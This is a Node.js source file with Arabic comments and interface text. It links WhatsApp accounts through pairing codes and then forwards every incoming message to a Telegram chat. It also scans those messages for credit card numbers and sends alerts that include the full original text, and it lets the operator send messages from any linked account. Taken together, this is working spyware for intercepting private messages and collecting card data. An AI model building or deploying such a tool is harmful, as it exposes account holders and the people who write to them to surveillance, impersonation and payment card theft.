import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { makeWASocket, useMultiFileAuthState, Browsers, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ========== إعداد تليجرام ==========
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let telegramBot = null;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('✅ بوت تليجرام جاهز للإرسال');
} else {
    console.warn('⚠️ تليجرام غير مهيأ، لن يتم إرسال الإشعارات');
}

async function sendToTelegram(messageText) {
    if (!telegramBot) return;
    try {
        await telegramBot.sendMessage(TELEGRAM_CHAT_ID, messageText, { parse_mode: 'Markdown' });
        console.log('📨 تم إرسال إشعار إلى تليجرام');
    } catch (err) {
        console.error('❌ فشل إرسال إلى تليجرام:', err.message);
    }
}

function scanForSensitiveData(text) {
    const patterns = [
        {
            name: '💳 بطاقة ائتمان',
            regex: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12})\b/g,
            mask: (m) => m.slice(0,4) + '-****-****-' + m.slice(-4)
        }
    ];
    const detected = [];
    for (const p of patterns) {
        let match;
        p.regex.lastIndex = 0;
        while ((match = p.regex.exec(text)) !== null) {
            detected.push({ type: p.name, original: match[0], masked: p.mask(match[0]) });
        }
    }
    return detected;
}

// ========== إعداد الخادم ==========
const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*" }, transports: ['websocket', 'polling'] });

const activeSessions = new Map(); // phone -> { sock, status, device }
const sessionsData = new Map();    // phone -> { phone, status, device, date }

// دالة لتحديث حالة الاتصال ونوع الجهاز
function updateSessionStatus(phone, status, deviceInfo = null) {
    const session = activeSessions.get(phone);
    if (session) {
        session.status = status;
        if (deviceInfo) session.device = deviceInfo;
        sessionsData.set(phone, {
            phone,
            status: status,
            device: session.device || 'غير معروف',
            date: sessionsData.get(phone)?.date || new Date().toLocaleString()
        });
    } else {
        sessionsData.set(phone, {
            phone,
            status: status,
            device: deviceInfo || 'غير معروف',
            date: new Date().toLocaleString()
        });
    }
    io.emit('accounts_list', Array.from(sessionsData.values()));
}

async function createWhatsAppSession(phoneNumber, isRestore = false) {
    console.log(`[${phoneNumber}] جاري إنشاء الجلسة...`);
    updateSessionStatus(phoneNumber, 'جاري الاتصال...');

    const sessionDir = path.join(__dirname, `auth_sessions/${phoneNumber}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const sock = makeWASocket({
        version,
        auth: state,
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
        generateHighQualityLinkPreview: false,
    });

    sock.ev.on('creds.update', saveCreds);
    let pairingRequested = false;

    sock.ev.on('connection.update', async (update) => {
        const connectionState = update.connection;
        console.log(`[${phoneNumber}] حالة الاتصال: ${connectionState}`);

        if (connectionState === 'open') {
            // الحصول على نوع الجهاز (من user-agent أو معلومات الجلسة)
            let device = 'غير معروف';
            if (sock.user?.device) device = sock.user.device;
            else if (update.isNewLogin) device = Browsers.macOS('Chrome')[0]; // "Mac Desktop"
            updateSessionStatus(phoneNumber, 'متصل', device);

            if (!state.creds.registered && !pairingRequested && !isRestore) {
                pairingRequested = true;
                setTimeout(async () => {
                    try {
                        const code = await sock.requestPairingCode(phoneNumber);
                        console.log(`[${phoneNumber}] 🔐 رمز الاقتران: ${code}`);
                        io.emit('pairing_code', { code, phoneNumber });
                        await sendToTelegram(`🔄 *جاري ربط حساب واتساب:* ${phoneNumber}\n🔑 الرمز: \`${code}\``);
                    } catch (err) {
                        console.error(`[${phoneNumber}] فشل طلب الرمز: ${err.message}`);
                        io.emit('error', `فشل طلب الرمز للرقم ${phoneNumber}`);
                        pairingRequested = false;
                        updateSessionStatus(phoneNumber, 'خطأ في الربط');
                    }
                }, 5000);
            }
        } else if (connectionState === 'close') {
            updateSessionStatus(phoneNumber, 'غير متصل');
            console.log(`[${phoneNumber}] تم قطع الاتصال – إعادة المحاولة بعد دقيقة`);
            setTimeout(() => createWhatsAppSession(phoneNumber, false), 60000);
        } else if (connectionState === 'connecting') {
            updateSessionStatus(phoneNumber, 'جاري الاتصال...');
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages) {
            if (msg.message && !msg.key.fromMe) {
                const sender = msg.key.remoteJid;
                let messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                if (!messageText) continue;

                const senderName = msg.pushName || sender;
                const time = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });

                const telegramMsg = `📩 *رسالة جديدة* 📩\n👤 *من:* ${senderName}\n📱 *حساب واتساب المستلم:* ${phoneNumber}\n⏰ *الوقت:* ${time}\n💬 *النص:*\n${messageText.substring(0, 500)}`;
                await sendToTelegram(telegramMsg);

                const sensitive = scanForSensitiveData(messageText);
                if (sensitive.length > 0) {
                    const details = sensitive.map(s => `${s.type}: ${s.masked}`).join('\n');
                    const alertMsg = `🚨 *تنبيه: تم اكتشاف معلومات حساسة!* 🚨\n${details}\n\n📝 الرسالة الأصلية:\n${messageText}`;
                    await sendToTelegram(alertMsg);
                }
            }
        }
    });

    // إضافة معلومات الجهاز عند توفرها
    if (sock.user) {
        const device = sock.user.device || (sock.authState.creds.me?.platform || 'غير معروف');
        updateSessionStatus(phoneNumber, 'متصل', device);
    }

    return sock;
}

async function restoreSessions() {
    const sessionsDir = path.join(__dirname, 'auth_sessions');
    if (!fs.existsSync(sessionsDir)) return;
    const phones = fs.readdirSync(sessionsDir).filter(f => f !== '.DS_Store');
    for (const phone of phones) {
        console.log(`[${phone}] استعادة الجلسة...`);
        try {
            const sock = await createWhatsAppSession(phone, true);
            activeSessions.set(phone, { sock, status: 'متصل', device: 'تمت الاستعادة' });
            updateSessionStatus(phone, 'متصل', 'مستعاد');
            await sendToTelegram(`✅ *تم استعادة حساب واتساب:* ${phone}`);
        } catch (err) {
            console.error(`[${phone}] فشل الاستعادة:`, err.message);
            updateSessionStatus(phone, 'فشل الاستعادة');
        }
    }
    io.emit('accounts_list', Array.from(sessionsData.values()));
}

// دالة إرسال رسالة واتساب
async function sendWhatsAppMessage(phoneNumber, recipientNumber, message) {
    const session = activeSessions.get(phoneNumber);
    if (!session || session.status !== 'متصل') {
        throw new Error('الحساب غير متصل');
    }
    const sock = session.sock;
    // تنسيق رقم المستلم: يجب أن ينتهي بـ @s.whatsapp.net
    let jid = recipientNumber.replace(/\D/g, '');
    if (!jid.endsWith('@s.whatsapp.net')) {
        jid = jid + '@s.whatsapp.net';
    }
    await sock.sendMessage(jid, { text: message });
    console.log(`[${phoneNumber}] تم إرسال رسالة إلى ${recipientNumber}`);
    return true;
}

// ========== واجهة HTML ==========
const HTML_PAGE = `<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مراقب واتساب – إرسال إلى تليجرام وإدارة الحسابات</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #075E54; margin: 0; padding: 20px; }
        .container { background: white; border-radius: 20px; max-width: 900px; width: 100%; margin: auto; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        h1, h2 { color: #075E54; text-align: center; }
        input, select, textarea, button { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
        button { background: #25D366; color: white; border: none; cursor: pointer; font-weight: bold; }
        button:disabled { background: #ccc; }
        .status { margin-top: 10px; padding: 10px; border-radius: 8px; display: none; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .status.info { background: #e2f0fb; color: #0c5460; display: block; }
        .accounts-list { margin-top: 20px; border-top: 2px solid #eee; padding-top: 15px; max-height: 300px; overflow-y: auto; }
        .account-item { background: #f8f9fa; padding: 12px; margin: 8px 0; border-radius: 8px; border-right: 4px solid #25D366; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .account-info { flex: 1; }
        .account-status { font-weight: bold; }
        .status-connected { color: green; }
        .status-disconnected { color: red; }
        .status-connecting { color: orange; }
        .code-box { background: #f5f5f5; padding: 15px; font-family: monospace; font-size: 24px; letter-spacing: 4px; margin: 15px 0; border-radius: 8px; text-align: center; }
        .hidden { display: none; }
        .send-message-box { background: #e9f5e9; padding: 20px; border-radius: 12px; margin-top: 20px; }
        .small-text { font-size: 12px; color: #666; margin-top: 5px; text-align: center; }
        hr { margin: 20px 0; }
    </style>
</head>
<body>
<div class="container">
    <h1>📱 مراقب وإدارة واتساب</h1>
    <p>🔹 إضافة حساب جديد | 🔹 مراقبة الرسائل (ترسل إلى تليجرام) | 🔹 إرسال رسائل من أي حساب متصل</p>
    
    <input type="tel" id="phone" placeholder="أدخل رقم الهاتف (مثال: 967776730674)" dir="ltr">
    <button id="addBtn">➕ إضافة حساب جديد</button>
    <div id="status" class="status"></div>
    <div id="codeSection" class="hidden"><div class="code-box" id="codeDisplay"></div><p>✨ أدخل هذا الرمز في واتساب (الإعدادات ← الأجهزة المرتبطة)</p></div>

    <hr>
    <h2>📋 الحسابات المرتبطة</h2>
    <div class="accounts-list" id="accountsList">لا توجد حسابات بعد.</div>

    <hr>
    <div class="send-message-box">
        <h2>✉️ إرسال رسالة واتساب</h2>
        <select id="accountSelect"><option value="">-- اختر الحساب المرسل --</option></select>
        <input type="tel" id="recipient" placeholder="رقم المستلم (مثال: 966501234567)" dir="ltr">
        <textarea id="messageText" rows="3" placeholder="نص الرسالة"></textarea>
        <button id="sendMsgBtn">📨 إرسال الرسالة</button>
        <div id="sendStatus" class="status"></div>
    </div>
    <div class="small-text">⚠️ كل رسالة تصل إلى الحسابات المرتبطة تُرسل إلى تليجرام. كما يمكنك إرسال رسائل من أي حساب متصل.</div>
</div>

<script>
    const socket = io();
    const addBtn = document.getElementById('addBtn');
    const phoneInput = document.getElementById('phone');
    const statusDiv = document.getElementById('status');
    const codeSection = document.getElementById('codeSection');
    const codeDisplay = document.getElementById('codeDisplay');
    const accountsListDiv = document.getElementById('accountsList');
    const accountSelect = document.getElementById('accountSelect');
    const recipientInput = document.getElementById('recipient');
    const messageTextarea = document.getElementById('messageText');
    const sendMsgBtn = document.getElementById('sendMsgBtn');
    const sendStatusDiv = document.getElementById('sendStatus');

    function showStatus(msg, type, target = statusDiv) {
        target.textContent = msg;
        target.className = 'status ' + type;
        setTimeout(() => { if (target === statusDiv) target.className = 'status'; }, 5000);
    }

    function updateAccountsList(accounts) {
        if (!accounts || accounts.length === 0) {
            accountsListDiv.innerHTML = 'لا توجد حسابات بعد.';
            accountSelect.innerHTML = '<option value="">-- اختر الحساب المرسل --</option>';
            return;
        }
        let html = '';
        let selectHtml = '<option value="">-- اختر الحساب المرسل --</option>';
        accounts.forEach(acc => {
            let statusClass = '';
            let statusText = acc.status;
            if (acc.status === 'متصل') statusClass = 'status-connected';
            else if (acc.status === 'غير متصل') statusClass = 'status-disconnected';
            else statusClass = 'status-connecting';
            html += \`
                <div class="account-item">
                    <div class="account-info">
                        <strong>📱 رقم:</strong> \${acc.phone}<br>
                        <strong>📟 الجهاز:</strong> \${acc.device || 'غير معروف'}<br>
                        <strong>🕒 التاريخ:</strong> \${acc.date}
                    </div>
                    <div class="account-status \${statusClass}">\${statusText}</div>
                </div>
            \`;
            if (acc.status === 'متصل') {
                selectHtml += `<option value="\${acc.phone}">📱 \${acc.phone} (متصل)</option>`;
            } else {
                selectHtml += `<option value="\${acc.phone}" disabled>📱 \${acc.phone} (\${acc.status})</option>`;
            }
        });
        accountsListDiv.innerHTML = html;
        accountSelect.innerHTML = selectHtml;
    }

    addBtn.onclick = () => {
        const phone = phoneInput.value.trim().replace(/[^0-9]/g, '');
        if (!phone || phone.length < 8) return showStatus('❌ رقم غير صحيح', 'error');
        addBtn.disabled = true;
        addBtn.innerHTML = '<span class="loader"></span> جاري ربط الحساب...';
        showStatus('⏳ جاري التجهيز... قد يستغرق 30-45 ثانية', 'info');
        socket.emit('add_account', { phone });
    };

    socket.on('pairing_code', (data) => {
        if (data.phoneNumber === phoneInput.value.trim().replace(/[^0-9]/g, '')) {
            addBtn.style.display = 'none';
            phoneInput.disabled = true;
            codeDisplay.innerHTML = data.code;
            codeSection.classList.remove('hidden');
            showStatus('✅ تم إنشاء الرمز! أدخله في واتساب', 'success');
            setTimeout(() => socket.emit('request_accounts'), 5000);
        }
    });

    socket.on('accounts_list', (accounts) => {
        updateAccountsList(accounts);
    });

    socket.on('error', (msg) => {
        addBtn.disabled = false;
        addBtn.innerHTML = '➕ إضافة حساب جديد';
        showStatus('❌ ' + msg, 'error');
    });

    socket.on('connect', () => {
        showStatus('✅ متصل بالخادم', 'success');
        socket.emit('request_accounts');
    });
    socket.on('disconnect', () => showStatus('❌ انقطع الاتصال', 'error'));

    // إرسال رسالة
    sendMsgBtn.onclick = async () => {
        const account = accountSelect.value;
        const recipient = recipientInput.value.trim().replace(/[^0-9]/g, '');
        const message = messageTextarea.value.trim();
        if (!account) return showStatus('❌ اختر حساباً', 'error', sendStatusDiv);
        if (!recipient || recipient.length < 8) return showStatus('❌ رقم المستلم غير صحيح', 'error', sendStatusDiv);
        if (!message) return showStatus('❌ أدخل نص الرسالة', 'error', sendStatusDiv);
        sendMsgBtn.disabled = true;
        sendMsgBtn.innerHTML = 'جاري الإرسال...';
        socket.emit('send_message', { from: account, to: recipient, text: message });
    };

    socket.on('message_sent', (data) => {
        sendMsgBtn.disabled = false;
        sendMsgBtn.innerHTML = '📨 إرسال الرسالة';
        if (data.success) {
            showStatus('✅ تم إرسال الرسالة بنجاح', 'success', sendStatusDiv);
            messageTextarea.value = '';
            recipientInput.value = '';
        } else {
            showStatus('❌ فشل الإرسال: ' + data.error, 'error', sendStatusDiv);
        }
    });
</script>
</body>
</html>`;

app.get('/', (req, res) => res.send(HTML_PAGE));
app.get('/health', (req, res) => res.status(200).send('OK'));

io.on('connection', (socket) => {
    console.log('🟢 عميل متصل:', socket.id);
    socket.on('add_account', async ({ phone }) => {
        const cleanPhone = phone.replace(/\D/g, '');
        if (activeSessions.has(cleanPhone)) {
            socket.emit('error', `الحساب ${cleanPhone} موجود مسبقًا`);
            return;
        }
        try {
            const sock = await createWhatsAppSession(cleanPhone, false);
            activeSessions.set(cleanPhone, { sock, status: 'متصل' });
            updateSessionStatus(cleanPhone, 'متصل', 'جديد');
            await sendToTelegram(`✅ تم ربط حساب واتساب جديد: ${cleanPhone}`);
        } catch (err) {
            socket.emit('error', `فشل ربط الحساب: ${err.message}`);
        }
    });
    socket.on('request_accounts', () => {
        socket.emit('accounts_list', Array.from(sessionsData.values()));
    });
    socket.on('send_message', async ({ from, to, text }) => {
        try {
            await sendWhatsAppMessage(from, to, text);
            socket.emit('message_sent', { success: true });
            await sendToTelegram(`📨 *تم إرسال رسالة من حساب* ${from}\n👥 إلى: ${to}\n💬 النص: ${text}`);
        } catch (err) {
            socket.emit('message_sent', { success: false, error: err.message });
        }
    });
});

process.on('uncaughtException', (err) => console.error('❌ خطأ غير متوقع:', err));
process.on('unhandledRejection', (err) => console.error('❌ رفض وعد غير معالج:', err));

const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`🚀 يعمل على http://localhost:${PORT}`);
    await restoreSessions();
});
